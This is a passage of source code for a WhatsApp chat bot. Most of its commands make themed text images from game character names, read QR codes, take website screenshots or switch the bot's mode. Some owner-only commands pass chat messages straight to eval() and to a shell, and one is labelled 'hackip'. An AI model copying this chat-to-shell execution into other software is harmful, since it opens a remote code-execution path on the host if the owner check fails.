'xeniel', 'wonderwoman-2', 'violet-4', 'preyta2', 'diaochan-3', 'airi-4', 'valhein-4', 'preyta-3', 'nina-3', 'alice-2', 'airi-5', 'telannas-3', 'ormarr-4', 'ormarr-3', 'nakroth-4', 'kilgroth-2', 'kahlii-3', 'grakk-3', 'natalya-5', 'fennik-4', 'teemee-2', 'teemee', 'lindis', 'zuka-3', 'valhein-2', 'tulen', 'toro-2', 'naloch-4', 'naloch-3', 'lumburr', 'lindis-2', 'grakk-4', 'gildur-3', 'toro-3', 'omen-2', 'omen', 'zill-3', 'telannas-', 'athur-4', 'zuka-4', 'tulen-2', 'nakroth-5', 'nax', 'liliana', 'raz-3', 'liliana-2', 'tulen-3', 'nax-2', 'flash', 'cresht-3', 'cresht-2', 'chaugnar-2', 'aleister-3', 'ryoma-3', 'kriknak-3', 'airi-6', 'wisp-2', 'wisp', 'batman-3', 'arum-2', 'arum', 'butterfly-6', 'rourke-2', 'rourke', 'narja-2', 'narja', 'taara-3', 'jinna-3', 'butterfly-7', 'arthur-4', 'arthur-3', 'arthur-2', 'valhein-3', 'superman-3', 'liliana-3', 'kilgroth-3', 'roxie-2', 'roxie', 'wukong-4', 'baldum-2', 'baldum', 'zephys-4', 'annette-2', 'annette', 'alice-3', 'telannas6', 'raz-4', 'nurad-6', 'nurad-5', 'jinna-4', 'amily', 'ybneth-2', 'ybneth', 'ilumia-4', 'astrid-3', 'amily-2', 'liliana-4', 'xeniel-5', 'veera-5', 'flash-2', 'athur-5', 'omen-3', 'lindis-3', 'elsu-2', 'elsu', 'richter-2', 'richter', 'nina-4', 'wirosableng', 'thane-3', 'ryoma-4', 'quillen-2', 'quillen', 'lauriel-5', 'arum-3', 'wisp-3', 'violet-7', 'sephera-2', 'sephera', 'naloch-5', 'krixi-6', 'alice-4', 'tulen-5', 'skud-3', 'rourke-3', 'nakroth-6', 'florentino-2', 'florentino', 'elsu-3', 'utterfly-8', 'amily-3', 'zuka-7', 'zuka-6', 'yorn-6', 'yorn-5', 'veres-2', 'veres', 'naloch-6', 'cresht-4', 'azzenka-3', 'airi-7', 'zephys-5', 'yorn-7', 'violet-8', 'valhein-5', 'tulen-6', 'thane-4', 'roxie-3', 'nakroth-7', 'kahlii-4', 'elsu-4', 'darcy2', 'darcy', 'capheny', 'zill-4', 'hayate-2', 'hayate', 'cresht-5', 'annette-3', 'amily-4', 'tulen-7', 'telannas-7', 'omen-4', 'lindis-4', 'liliana-5', 'ignis-3', 'errol', 'capheny-2', 'arum-4', 'zanis-6', 'wukong-5', 'thane-5', 'slimz-4', 'skud-4', 'richter-3', 'quillen-3', 'azzenka-4', 'arduin-3', 'airi-8']
                if (!style.includes(m2)) {
                    getStyle(style.length, "avatar")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        avatar: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
      case 'readqr': {
    if (isBan) return reply(mess.ban)
     if (!isMedia) return reply(`*Kᴏᴅᴇ QR ᴍᴀɴᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ʟɪʜᴀᴛ ᴅᴀʟᴀᴍ ᴋᴏᴅᴇɴʏᴀ ?*`)
  let buffer = await tganz.downloadAndSaveMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
    var Jimp = require("jimp");
   Jimp.read(buffer, function(err, image) {
    if (err) {
        console.error(err);
        // TODO handle error
    }
    var qr = new QrCode();
    qr.callback = function(err, value) {
        if (err) {
            console.error(err);
            // TODO handle error
        }
        console.log(value.result);
       m.reply(value.result)     
    };
    qr.decode(image.bitmap);
    });
   }
   break
            case 'beautifulgalaxylol': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|khazix-2`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|khazix-2`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['ashe-2', 'darius-2', 'hecarim-2', 'akali-2', 'jhin-2', 'jinx-2', 'kaisa-2', 'khazix-2', 'nordekaiser-2', 'pantheon-2', 'qiyana', 'rammus-2', 'renekton-2', 'tahmkench-2', 'teemo-2', 'udyr-2', 'yasuo-2', 'yuumi', 'drmundo', 'zyra', 'zoe', 'zilean', 'ziggs', 'zed', 'zac', 'yorick', 'yasuo', 'xinzhao', 'xerath', 'xayah', 'wukong', 'warwick', 'volibear', 'vladimir', 'viktor', 'vi', 'velkoz', 'veigar', 'vayne', 'varus', 'urgot', 'udyr', 'twitch', 'twistedfate', 'tryndamere', 'trundle', 'tristana', 'thresh', 'teemo', 'taric', 'talyah', 'talon', 'tahmkench', 'syndra', 'swain', 'soraka', 'sona', 'skarner', 'sivir', 'sion', 'singed', 'shyvana', 'shen', 'shaco', 'sejuani', 'ryze', 'rumble', 'riven', 'rengar', 'renekton', 'reksai', 'rammus', 'rakan', 'quinn', 'poppy', 'pantheon', 'ornn', 'orianna', 'olaf', 'nunu', 'nocturne', 'nidalee', 'nautilus', 'nasus', 'nami', 'norgana', 'norderkaiser', 'nissfortune', 'nasteryi', 'nalzahar', 'nalphite', 'lux', 'lulu', 'lucian', 'lissandra', 'leona', 'leesin', 'leblanc', 'kogmaw', 'kled', 'kindred', 'khazix', 'kennen', 'kayn', 'kayle', 'katarina', 'kassadin', 'karthus', 'karma', 'kalista', 'kaisa', 'jinx', 'jhin', 'jayce', 'jax', 'jarvaniv', 'janna', 'ivern', 'irelia', 'illaoi', 'heimerdinger', 'hecarim', 'graves', 'gragas', 'gnar', 'garen', 'gangplank', 'galio', 'fizz', 'fiora', 'fiddlesticks', 'ezreal', 'evelynn', 'elise', 'ekko', 'draven', 'diana', 'darius', 'corki', 'chogath', 'cassiopeia', 'camille', 'caitlyn', 'braum', 'brand', 'blitzcrank', 'bard', 'azir', 'aurelionsol', 'ashe', 'annie', 'anivia', 'amumu', 'alistar', 'akali', 'ahri', 'aatrox', 'sylas', 'pyke', 'nunuwillump', 'neeko', 'norgana-2', 'kayle-2', 'akali-2', 'aatrox-2']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case '>':
            case '>>':
            case '=>': {
            if (isBan) return reply(mess.ban)
         			if (!isCreator) return reply(mess.owner)
         			if (!q) return reply(`*Mᴀᴜ ᴇᴠᴀʟ ᴀᴘᴀ ᴋᴀᴋ ?*`)
         			m.reply(mess.wait)
         			try {
              let evaled = await eval(q)
              if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
              await tganz.sendText(from, evaled)
             } catch (err) {
              console.error(err)
              await tganz.reply(mess.error)
            }
          }
               break
			         case '$':
			         case '=<': {
			         if (isBan) return reply(mess.ban)
	         		if (!isCreator) return reply(mess.owner)
			         if (!text) return m.reply(`*Kᴏᴅᴇ ᴀᴘᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪᴛᴇʀᴀᴘᴋᴀɴ ᴅɪ ᴛᴇʀᴍɪɴᴀʟ ᴍᴇʟᴀʟᴜɪ ʙᴏᴛ ɪɴɪ ?*`)
			         m.reply(mess.wait)
            execS(text, async (err, stdout) => {
            if (err) return m.reply(err)
            if (stdout) return m.reply(stdout)
            })
         }
            break
			         case 'hackip':
			         case 'iplookup': {
			        if (!isCreator) return reply(mess.owner)
			         if (isBan) return reply(mess.ban)
			        if (!text) return reply(`IP/Aᴅᴅʀᴇss ʟᴏᴋᴀsɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} 203.141.131.66*`)
			       m.reply(mess.wait)
			         let fetch = await fetchJson(`https://api.zahwazein.xyz/information/iplookup?query=${text}&apikey=${zenzkeyss}`)
        let caption = `Iɴғᴏʀᴍᴀsɪ Lᴏᴋᴀsɪ :\n\n`
        let i = fetch.result
        caption += `⭔ Nᴇɢᴀʀᴀ : ${i.country}\n`
        caption += `⭔ Wɪʟᴀʏᴀʜ : ${i.region}\n`
        caption += `⭔ Kᴏᴛᴀ : ${i.city}\n`
        caption += `⭔ Kᴏᴅᴇ Zɪᴘ : ${i.zip}\n`
        caption += `⭔ Gᴀʀɪs Lɪɴᴛᴀɴɢ : ${i.latitude}\n`
        caption += `⭔ Gᴀʀɪs Bᴜᴊᴜʀ : ${i.longtitude}\n`
        caption += `⭔ Aʟᴀᴍᴀᴛ ISP : ${i.isp}\n`
        caption += `⭔ Aʟᴀᴍᴀᴛ Dᴏᴍᴀɪɴ : ${i.domain}\n`
        caption += `⭔ Jᴇɴɪs Pᴇɴɢɢᴜɴᴀᴀɴ : ${i.usage_type}\n`
        caption += `⭔ Zᴏɴᴀ Wᴀᴋᴛᴜ : ${i.time_zone}\n`
        caption += `⭔ Wᴀᴋᴛᴜ Dᴀᴇʀᴀʜ : ${i.local_time}\n`
        caption += `⭔ Tɪᴘᴇ Aʟᴀᴍᴀᴛ : ${i.addres_type}\n`
        caption += `⭔ Kᴀᴛᴇɢᴏʀɪ : ${i.category}\n`
        caption += `⭔ Pʀᴏᴋsɪ/Pʀᴏxʏ : ${i.proxy}\n`
        caption += `⭔ Kᴀʀᴛᴜ Pʀᴏᴠɪᴅᴇʀ : ${i.provider}\n`
        caption += `⭔ Kᴇᴀᴅᴀᴀɴ Cᴜᴀᴄᴀ : ${i.weather}\n`
        tganz.sendMessage(m.chat, caption, m)
    }
    break
    case 'ipbot':
    case 'cekip':
    case 'ipsaya':
    case 'myip': {
          if (isBan) return reply(mess.ban)
          if (!isCreator) return reply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        m.reply("*🌏 Aʟᴀᴍᴀᴛ IP Kᴀᴍᴜ :* " + ip);
                    })
                })
            }
            break
           case 'pinstick':
           case 'stickpin':
           case 'spin':
           case 'stikerpin':
           case 'stickerpinterest':
           case 'stikerpinterest':
           case 'stickerpin': {
         if (isBan) return reply(mess.ban)
       if (!q) return reply(`Mᴀᴜ ᴄᴀʀɪ sᴛɪᴋᴇʀ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Dᴏʀᴀᴇᴍᴏɴ*`)
       tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
    try {
    let pint = await pinterest(`${q}`)
    let xm_za = pint[Math.floor(Math.random() * pint.length)]
    let hek = await getBuffer(xm_za)
     let buffers = await writeExifImg(hek, { packname: global.packname, author: global.author })
       await tganz.sendMessage(from, { sticker: { url: buffers } }, { quoted: m })
       } catch (e) { e = String(e)
      m.reply('*Mᴀᴀғ sᴛɪᴋᴇʀ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ᴍᴀᴜ ᴛɪᴅᴀᴋ ᴀᴅᴀ, Sɪʟᴀʜᴋᴀɴ ᴄᴀʀɪ sᴛɪᴋᴇʀ ʟᴀɪɴ !!!*')
   }
  }
  break
            case 'ssweb': 
            case 'screnshotweb': 
            case 'screnshot': 
            case 'ss': {
      if (isBan) return reply(mess.ban)
         if (!q) return reply(`Lɪɴᴋɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command}* ⟨ Lɪɴᴋɴʏᴀ ⟩`)
            m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://image.thum.io/get/width/1200/crop/1200/allowJPG/${q}` }, caption: `*❑ Hᴀsɪʟ sᴄʀᴇᴇɴsʜᴏᴛ ᴅᴀʀɪ :* ⟨ ${q} ⟩`}, { quoted: m } )
           }
         break
          // Creator Image
	  case 'bucinsertifikat':
	  case 'sertifikatbucin':
	  case 'sertbucin':
	  case 'sertibucin':
			case 'bucincert': {
            if (isBan) return reply(mess.ban)
				if (args.length == 0) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix+ command} TᴇsᴛGᴀɴᴢ Gᴀɴᴛᴇɴ*`)
				m.reply(mess.wait)
				kueri = args.join(" ")
                tganz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${lolkeysapi}&name=${kueri}`}, caption: mess.done}, {quoted: m})
           }
            break
			case 'tololsert':
			case 'sertifikattolol':
			case 'serttolol':
			case 'tololcert':
			case 'sertitolol':
			case 'tololsertifikat': {
            if (isBan) return reply(mess.ban)
			if (args.length == 0) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix+ command} TᴇsᴛGᴀɴᴢ Gᴀɴᴛᴇɴ*`)
			m.reply(mess.wait)
			ytta = args.join(" ")
            tganz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${lolkeysapi}&name=${ytta}`}, caption: mess.done}, {quoted: m})
            }
            break
			case 'pacarsertifikat':
			case 'sertifikatpacar':
			case 'sertipacar':
			case 'sertpacar':
			case 'pacarcert': {
            if (isBan) return reply(mess.ban)
            if (args.length == 0) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} TᴇsᴛGᴀɴᴢ|Yᴇɴɪ*`)
            m.reply(mess.wait)
                get_args = args.join(" ").split("|")
                nik = get_args[0]
                prov = get_args[1]
			    titidnya = `*❑ Sᴇʀᴛɪғɪᴋᴀᴛ Pᴀsᴀɴɢᴀɴ :* ⟨ ${nik} ❤️ ${prov} ⟩`
            tganz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${lolkeysapi}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            }
            break
            case 'lolwallpaper': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|wallpaper\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|fizz`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|wallpaper\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|fizz`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['aatrox-2', 'arhi-2', 'akali-3', 'akali-2', 'braum', 'camille', 'evelynn-5', 'ezreal-2', 'fizz', 'graves-2', 'irelia-3', 'irelia-2', 'jayce-2', 'jhin-2', 'jinx-2', 'kaisa', 'katarina-2', 'lux-2', 'neeko', 'orianna-2', 'pantheon', 'pyke', 'qiyana', 'riven-2', 'sylas', 'teemo-2', 'viktor', 'vladimir', 'warwick-2', 'yasuo-3', 'yasuo-2', 'zoe', 'nasteryi', 'lux', 'lulu', 'leesin', 'jinx', 'jhin', 'ezreal', 'janna', 'ashe', 'arhi', 'poppy', 'nissfortune', 'soraka', 'syndra', 'zyra', 'yasuo', 'vi', 'vayne', 'taliyah', 'sona', 'sivir', 'shyvana', 'riven', 'quinn', 'nidalee', 'norgana', 'leblanc', 'kennen', 'karma', 'irelia', 'fiora', 'elise', 'diana', 'caitlyn', 'zed', 'xayah', 'tristana', 'talon', 'shen', 'rakan', 'orianna', 'nami', 'kayn', 'kayle', 'katarina', 'kalista', 'ekko', 'azir', 'udyr', 'thresh', 'tf', 'teemo', 'ryze', 'nocturne', 'lucian', 'khazik', 'graves', 'darius', 'annie', 'akali', 'zilean', 'ziggs', 'yorick', 'warwick', 'nasteryi-2', 'janna-2', 'hecarim', 'gangplank', 'fiora-2', 'draven', 'brand', 'aatrox', 'velkoz', 'shaco', 'rengar', 'reksai', 'ornn', 'leona', 'kindred', 'jayce', 'jax', 'jarvan-iv', 'garen', 'xinzhao', 'nasus', 'kled', 'evelynn-4', 'evelynn-3', 'evelynn-2', 'evelynn', 'cassiopeia', 'zac', 'xerath', 'wukong', 'velkoz-2', 'veigar', 'varus', 'urgot', 'twich', 'kassadin', 'elise-2', 'annie-2', 'alistar']
                if (!style.includes(m2)) {
                    getStyle(style.length, "wallpaper")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        wallpaper: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'tourl': {
            if (isBan) return reply(mess.ban)
            if (!mime) return reply(`◈ Gᴀᴍʙᴀʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*☞ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix+ command} ⟨ Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
             case 'publik':
             case 'public': {
            if (isBan) return reply(mess.ban)
        if (!isCreator) return m.reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ᴏᴡɴᴇʀᴋᴜ !')
        db.data.settings[botNumber].modebot23 = true
        m.reply('Sᴜᴋsᴇs ᴍᴇɴɢᴜʙᴀʜ ʙᴏᴛ ᴍᴇɴᴊᴀᴅɪ ᴍᴏᴅᴇ Pᴜʙʟɪᴋ !\n\n*© TᴇsᴛGᴀɴᴢ*')
        }
           break
             case 'sendiri':
             case 'self': {
            if (isBan) return reply(mess.ban)
        if (!isCreator) return m.reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ᴏᴡɴᴇʀᴋᴜ !')
        db.data.settings[botNumber].modebot23 = false
        m.reply('Sᴜᴋsᴇs ᴍᴇɴɢᴜʙᴀʜ ʙᴏᴛ ᴍᴇɴᴊᴀᴅɪ ᴍᴏᴅᴇ Pʀɪʙᴀᴅɪ !\n\n*© TᴇsᴛGᴀɴᴢ*')
        }
           break
           case 'modebot': 
           case 'mode': {
      if (isBan) return m.reply(mess.ban)
      if (!isCreator) return m.reply(mess.owner)
      if (args[0] === 'on') {
      db.data.settings[botNumber].modebot23 = true // Pribadi !
      m.reply('*Sᴇʟᴇsᴀɪ, sᴇᴋᴀʀᴀɴɢ ʙᴏᴛ ᴍᴇɴᴊᴀᴅɪ ᴍᴏᴅᴇ ᴘʀɪʙᴀᴅɪ sᴇʙᴀɢᴀɪᴍᴀɴᴀ ʜᴀɴʏᴀ ᴏᴡɴᴇʀ/ᴘᴇɴᴄɪᴘᴛᴀ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴɴʏᴀ !!!*')
      } else if (args[0] === 'off') {
      db.data.settings[botNumber].modebot23 = false // Semua !
      m.reply('*Sᴇʟᴇsᴀɪ, sᴇᴋᴀʀᴀɴɢ ʙᴏᴛ ᴍᴇɴᴊᴀᴅɪ ᴍᴏᴅᴇ ᴘᴜʙʟɪᴋ ᴅᴀɴ ʙɪsᴀ ᴅɪ ᴀᴋsᴇs ᴅɪ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ᴍᴀᴜᴘᴜɴ ᴘᴇɴɢɢᴜɴᴀ ʟᴀɪɴ !!!*')
      } else {
      let buttonsntilink = [
  { buttonId: `.${command} off`, buttonText: { displayText: '👤 SELF' }, type: 1 },
  { buttonId: `.${command} on`, buttonText: { displayText: 'PUBLIC 👥' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ᴍᴏᴅᴇ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ, sᴇʟғ = sᴇɴᴅɪʀɪ / ᴘᴜʙʟɪᴋ = sᴇᴍᴜᴀ ᴏʀᴀɴɢ !!!*`, footer_text, m)
  }
  }
       break
            case 'coverdota2': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|luna`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|luna`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['void', 'riki', 'lycan', 'ursa', 'zeus', 'dragonkinght', 'warlord', 'phantomassassin', 'bountyhunter', 'antimage', 'spectre', 'luna', 'vengerfulspirit', 'undying', 'tusk', 'tinker', 'shadowfiend', 'sandking', 'nightstalker', 'nagasiren', 'nirana', 'neepo', 'lina', 'juggernaut', 'huskar', 'emberspirit', 'emberspirit', 'emberspirit', 'earthshaker', 'drowranger', 'clockwerk', 'bristleback', 'bloodseeker', 'axe']
                if (!style.includes(m2)) {
                    getStyle(style.length, "heroes")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        heroes: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'coverleagueofking': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nina`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nina`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['thane', 'orrmarr', 'omega', 'nakroth', 'nina', 'ngangar', 'gildur', 'dieuthuyen', 'chaugnar', 'butterfly', 'azzenka', 'alice', 'lubo', 'kriknak-2', 'natalya-2', 'trieu-van', 'taara-2', 'naloch', 'kriknak', 'natalya', 'taara', 'ngo-khong', 'airi', 'butterfly-2', 'butterfly-3', 'kahlii', 'krixi', 'toro', 'grakk', 'ilumia', 'zephys', 'veera-2', 'violet', 'preyta-2', 'violet-2', 'valhein', 'yorn', 'veera', 'notos', 'valhein-2', 'preyta', 'illumia-2', 'fennik-2', 'lumburr', 'fennik', 'nakroth-2', 'krixi-2', 'gildur2']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'avatar3q360': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|truong_phi`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|truong_phi`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['tieu_kieu', 'luu_bi', 'truong_oanh_oanh', 'truong_phi', 'tu_ma_y', 'van_uong', 'hoang_nguyet_anh', 'hoang_nguyet_anh2', 'hoang_trung', 'hua_chu', 'truong_giac', 'dieu_thuyen']
                if (!style.includes(m2)) {
                    getStyle(style.length, "avatar")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        avatar: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'coverofwarface': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|warface`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|warface`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['warface-4', 'warface-3', 'warface-2', 'warface', 'sniper-3', 'sniper-2', 'sniper', 'rifleman', 'nedic-2', 'nedic', 'exosuit', 'engineer']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'newlolavatar': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|shyvana`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|shyvana`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['udyr', 'twitch', 'twistedfate', 'trundle', 'teemo', 'swain', 'shyvana', 'shen', 'sejuani', 'renekton', 'reksai', 'rammus', 'zyra', 'zilean', 'ziggs', 'zac', 'xerath', 'warwick', 'vladimir', 'viktor', 'vi', 'velkoz', 'veigar', 'vayne', 'volibear', 'tristana', 'taliyah', 'shaco', 'leblanc', 'jinx', 'graves', 'fizz', 'ekko', 'corki', 'cassiopeia', 'caitlyn', 'blitzcrank', 'bard', 'alistar', 'akali', 'aatrox', 'janna', 'wukong', 'thresh', 'taric', 'talon', 'ryze', 'nordekaiser', 'karma', 'kalista', 'irelia', 'gnar', 'garen', 'galio', 'soraka', 'sona', 'sivir', 'riven', 'quinn', 'nocturne', 'nami', 'lux', 'kindred', 'khazix', 'katarina', 'jarvan', 'fiora', 'diana', 'aurelionsol', 'ashe', 'ahri', 'varus', 'syndra', 'nidalee', 'kennen', 'jhin', 'zed', 'yasuo', 'rengar', 'lucian', 'ezreal', 'azir', 'annie', 'leesin', 'nasteryi', 'poppy', 'pantheon', 'orianna', 'nasus', 'norgana', 'nissfortune', 'naokai', 'nalzaha', 'lulu', 'lissandra', 'leona', 'kled', 'jayce', 'jax', 'illaoi', 'xayah', 'rakan', 'gangplank', 'naster_yi2', 'riven2', 'elise', 'darius', 'xayah_rakan', 